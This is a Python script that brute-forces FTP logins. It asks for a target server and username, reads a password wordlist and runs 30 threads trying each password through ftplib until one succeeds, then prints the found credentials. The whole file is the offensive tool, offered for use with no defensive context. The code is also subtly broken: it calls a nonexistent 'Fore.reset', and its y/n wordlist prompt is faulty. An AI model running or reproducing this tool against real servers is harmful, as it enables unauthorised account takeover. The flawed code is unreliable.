import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else
print(f"""{Fore.MAGENTA}
                                          
 _______  _______  _______ 
|   _   ||       ||   _   |
|.  1___||.|   | ||.  1   |
|.  __)  `-|.  |-'|.  ____|
|:  |      |:  |  |:  |    
|::.|      |::.|  |::.|    
`---'      `---'  `---'   

""")
q = queue.Queue()

n_threads = 30

host = input("Please enter the ftp servers ip: ")

user = input(f"Which username do you want to brute force: {Fore.RESET}")

port = 21


    


def connect_ftp():
    global q
    while True:
        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:

            q.task_done()

            


w = input(f"{Fore.RED} Do you want to use a custom wordlist? {Fore.reset}")
if w == "y":
    wordlist = input("Please enter the path of the wordlist: ")
if w == "n":
    wordlist = "wordlist.txt"
else:
    print("Please answer with y or n")
passwords = open(wordlist, encoding="utf8").read().split("\n")
print("[+] Passwords to try:", len(passwords))

for password in passwords:
    q.put(password)

for t in range(n_threads):
    thread = Thread(target=connect_ftp)

    thread.daemon = True
    thread.start()

q.join()
